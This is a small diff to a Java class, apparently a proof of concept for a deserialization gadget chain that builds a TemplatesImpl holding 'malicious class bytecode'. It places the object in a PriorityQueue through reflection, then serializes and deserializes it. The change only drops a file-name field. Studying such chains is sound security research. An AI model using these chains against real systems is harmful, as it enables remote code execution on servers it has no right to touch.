@@ -15,8 +15,6 @@ import java.util.PriorityQueue;
  */
 public class Click {
 
-	public static String fileName = "Click.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -47,8 +45,8 @@ public class Click {
 		field2.setAccessible(true);
 		field2.set(queue, comparator);
 
-		SerializeUtil.writeObjectToFile(queue, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(queue);
+		SerializeUtil.readFileObject();
 	}
 
 }
